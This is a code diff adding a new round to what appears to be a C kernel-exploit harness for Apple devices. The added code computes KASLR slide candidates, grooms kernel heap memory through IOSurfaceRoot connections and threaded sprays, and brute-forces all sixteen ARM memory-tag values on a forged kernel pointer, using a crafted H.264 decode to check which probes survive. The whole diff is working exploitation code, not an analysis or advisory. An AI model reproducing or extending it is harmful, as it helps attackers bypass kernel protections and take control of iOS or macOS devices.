@@ -24816,6 +24816,170 @@ new_modes:
                 rlog("=== r=204 complete ===\n");
             }
 
+            /* r=205: MTE tag probe — test one candidate with all 16 tags */
+            if (rounds == 205) {
+                rlog("\n=== r=205: MTE tag probe ===\n");
+                int r205_ci = 130; /* mid-range candidate */
+                if (argc > 3) r205_ci = atoi(argv[3]);
+
+                rlog("  Candidate index: %d\n", r205_ci);
+                uint64_t r205_cand = R203_SLIDE_MIN + (uint64_t)r205_ci * R203_SLIDE_STEP;
+                uint64_t r205_base = R198_KC_BASE + r205_cand + BSS_MID_DEFAULT;
+
+                io_service_t r205_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r205_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r205_done; }
+
+                io_connect_t r205_gconns[R203_GROOM_N];
+                mach_port_t r205_gwps[R203_GROOM_N];
+                int r205_gn = 0;
+                for (int g = 0; g < R203_GROOM_N; g++) {
+                    io_connect_t gc = IO_OBJECT_NULL;
+                    if (IOServiceOpen(r205_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        r205_gconns[r205_gn] = gc;
+                        r205_gwps[r205_gn] = gwp;
+                        r205_gn++;
+                    }
+                }
+                rlog("  Pre-opened %d groom conns\n", r205_gn);
+
+                p16_groom_conns = r205_gconns;
+                p16_groom_wps = r205_gwps;
+                p16_groom_n = r205_gn;
+
+                for (int tag = 0; tag < 16; tag++) {
+                    uint64_t r205_probe = (r205_base & 0x00FFFFFFFFFFFFFFULL) |
+                                          ((uint64_t)tag << 56);
+                    rlog("  TAG_PROBE tag=0x%X probe=0x%016llx\n", tag,
+                         (unsigned long long)r205_probe);
+
+                    uint64_t r205_data[4] = {r205_probe, 0, 0, 0};
+                    p16_groom_data = r205_data;
+
+                    p16_groom_count = 0;
+                    p16_groom_run = 1;
+                    pthread_t r205_gths[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&r205_gths[t], NULL, p16_groom_spray, NULL);
+                    usleep(1000);
+
+                    uint64_t r205_inp[3] = {1, 2, 3};
+                    io_connect_t r205_pcs[8]; int r205_phave[8];
+                    for (int i = 0; i < 8; i++) {
+                        r205_phave[i] = (IOServiceOpen(r205_svc, mach_task_self(), 0,
+                            &r205_pcs[i]) == KERN_SUCCESS);
+                        if (r205_phave[i]) {
+                            mach_port_t tw = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                            mach_port_insert_right(mach_task_self(), tw, tw,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t si17[3]; uint32_t si17c = 3;
+                            IOConnectCallScalarMethod(r205_pcs[i], 17,
+                                r205_inp, 3, si17, &si17c);
+                            IOConnectCallScalarMethod(r205_pcs[i], 18,
+                                r205_inp, 3, si17, &si17c);
+                            mach_port_deallocate(mach_task_self(), tw);
+                        }
+                    }
+
+                    p16_groom_run = 0;
+                    for (int t = 0; t < 4; t++)
+                        pthread_join(r205_gths[t], NULL);
+                    rlog("    groom=%d\n", p16_groom_count);
+
+                    CFMutableDictionaryRef r205_pd =
+                        CFDictionaryCreateMutable(NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+                    int32_t r205_w = 64, r205_h = 64;
+                    CFNumberRef r205_wn = CFNumberCreate(NULL, kCFNumberSInt32Type, &r205_w);
+                    CFNumberRef r205_hn = CFNumberCreate(NULL, kCFNumberSInt32Type, &r205_h);
+                    CFDictionarySetValue(r205_pd, CFSTR("Width"), r205_wn);
+                    CFDictionarySetValue(r205_pd, CFSTR("Height"), r205_hn);
+                    int32_t r205_pf = 0x42475241;
+                    CFNumberRef r205_pfn = CFNumberCreate(NULL, kCFNumberSInt32Type, &r205_pf);
+                    CFDictionarySetValue(r205_pd, CFSTR("PixelFormat"), r205_pfn);
+
+                    CVPixelBufferRef r205_pb = NULL;
+                    CVPixelBufferCreate(NULL, r205_w, r205_h, r205_pf, r205_pd, &r205_pb);
+
+                    int r205_survived = 0;
+                    if (r205_pb) {
+                        VTDecompressionSessionRef ds = NULL;
+                        CMVideoFormatDescriptionRef vfd = NULL;
+                        CMVideoFormatDescriptionCreateFromH264ParameterSets(NULL,
+                            (const uint8_t *const []){
+                                (const uint8_t[]){0x67,0x42,0xc0,0x0a,0xd9,0x07,0x3c,0x04,0x40},
+                                (const uint8_t[]){0x68,0xce,0x38,0x80}
+                            },
+                            (const size_t[]){9, 4}, 2, 4, &vfd);
+                        if (vfd) {
+                            VTDecompressionOutputCallbackRecord cb = {
+                                .decompressionOutputCallback = NULL,
+                                .decompressionOutputRefCon = NULL
+                            };
+                            VTDecompressionSessionCreate(NULL, vfd, NULL, NULL, &cb, &ds);
+                        }
+                        if (ds) {
+                            const uint8_t nalu[] = {
+                                0x00,0x00,0x00,0x10,
+                                0x65,0x88,0x80,0x40,0x00,0x6b,0x6f,0xfe,
+                                0x5d,0xeb,0x52,0xeb,0x52,0xeb,0x52,0x00
+                            };
+                            CMBlockBufferRef bb = NULL;
+                            CMBlockBufferCreateWithMemoryBlock(NULL,
+                                (void *)nalu, sizeof(nalu), kCFAllocatorNull,
+                                NULL, 0, sizeof(nalu), 0, &bb);
+                            CMSampleBufferRef sb = NULL;
+                            CMSampleTimingInfo ti = {
+                                .duration = CMTimeMake(1, 30),
+                                .presentationTimeStamp = CMTimeMake(0, 30),
+                                .decodeTimeStamp = kCMTimeInvalid
+                            };
+                            const size_t ss = sizeof(nalu);
+                            CMSampleBufferCreateReady(NULL, bb, vfd, 1, 1, &ti, 1, &ss, &sb);
+                            if (sb) {
+                                VTDecodeFrameFlags ff = kVTDecodeFrame_1xRealTimePlayback;
+                                VTDecodeInfoFlags fi;
+                                VTDecompressionSessionDecodeFrame(ds, sb, ff, NULL, &fi);
+                                VTDecompressionSessionWaitForAsynchronousFrames(ds);
+                                r205_survived = 1;
+                                rlog("    tag=0x%X SURVIVED\n", tag);
+                                CFRelease(sb);
+                            }
+                            if (bb) CFRelease(bb);
+                            VTDecompressionSessionInvalidate(ds);
+                            CFRelease(ds);
+                        }
+                        if (vfd) CFRelease(vfd);
+                        CFRelease(r205_pb);
+                    }
+                    CFRelease(r205_pd); CFRelease(r205_wn);
+                    CFRelease(r205_hn); CFRelease(r205_pfn);
+
+                    for (int i = 0; i < 8; i++)
+                        if (r205_phave[i]) IOServiceClose(r205_pcs[i]);
+
+                    if (!r205_survived)
+                        rlog("    tag=0x%X CRASHED (should not see this)\n", tag);
+
+                    usleep(100000);
+                }
+
+                for (int g = 0; g < r205_gn; g++) {
+                    IOServiceClose(r205_gconns[g]);
+                    mach_port_deallocate(mach_task_self(), r205_gwps[g]);
+                }
+                IOObjectRelease(r205_svc);
+
+                r205_done:
+                rlog("=== r=205 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
